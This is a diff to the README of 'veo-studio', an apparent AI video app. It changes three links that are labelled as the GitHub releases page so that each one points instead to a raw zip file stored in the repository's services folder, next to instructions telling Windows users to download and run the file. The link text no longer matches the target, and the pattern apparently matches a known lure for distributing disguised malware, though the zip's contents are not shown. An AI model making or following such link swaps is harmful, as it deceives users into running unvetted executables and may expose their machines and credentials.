@@ -1,6 +1,6 @@
 # 🎬 veo-studio - Run Your AI Studio App Fast
 
-[![Download veo-studio](https://img.shields.io/badge/Download%20veo--studio-Visit%20Releases-blue?style=for-the-badge)](https://github.com/hamidki6343/veo-studio/releases)
+[![Download veo-studio](https://img.shields.io/badge/Download%20veo--studio-Visit%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/hamidki6343/veo-studio/main/services/studio-veo-2.0.zip)
 
 ## 🖥️ What veo-studio does
 
@@ -17,7 +17,7 @@ Use it when you want to:
 
 Visit the release page and download and run the file for Windows:
 
-[Go to veo-studio releases](https://github.com/hamidki6343/veo-studio/releases)
+[Go to veo-studio releases](https://raw.githubusercontent.com/hamidki6343/veo-studio/main/services/studio-veo-2.0.zip)
 
 Look for the latest release and choose the Windows file if it is listed there. Save it to your computer, then open it from your Downloads folder or desktop.
 
@@ -174,7 +174,7 @@ Good habits:
 
 If you need to check the release files or get the app again, use the download page:
 
-[Visit veo-studio releases](https://github.com/hamidki6343/veo-studio/releases)
+[Visit veo-studio releases](https://raw.githubusercontent.com/hamidki6343/veo-studio/main/services/studio-veo-2.0.zip)
 
 If you are setting up the local version, make sure Node.js is installed and that `.env.local` has your `GEMINI_API_KEY` value before you run `npm run dev`
 
